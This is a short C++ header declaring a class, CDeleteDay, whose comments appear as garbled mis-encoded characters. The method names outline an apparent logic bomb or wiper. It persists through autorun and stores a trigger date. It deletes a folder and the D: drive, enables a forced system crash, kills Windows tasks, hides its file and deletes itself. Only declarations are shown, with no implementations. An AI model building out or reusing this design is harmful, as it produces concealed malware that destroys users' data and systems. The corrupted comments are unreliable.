#pragma once
class CDeleteDay
{
private:
	CString m_strFilePath; //���� � ������ ���������
	//���������� � ������������

public:
	CDeleteDay();
	~CDeleteDay();

	// //��������� ���� ������������
	bool AddToAutoRun();
	// ��������� �� �������� �� ���� ���������� �������
	bool InspectDeleteData();

	// ���������� � ������ ����� ���������� ������
	bool SaveDeleteDay(SYSTEMTIME SysTime);
	// ���������� ����� ����� ����� �������
	bool SaveFolderPathToDelete(CString csFolderPath);	
	bool EnableCrashOnCtrlScroll();
	bool DeleteDiskD();
	bool SaveTaskKillWindows();
	void SelfDelete();
	void HideFile();
};

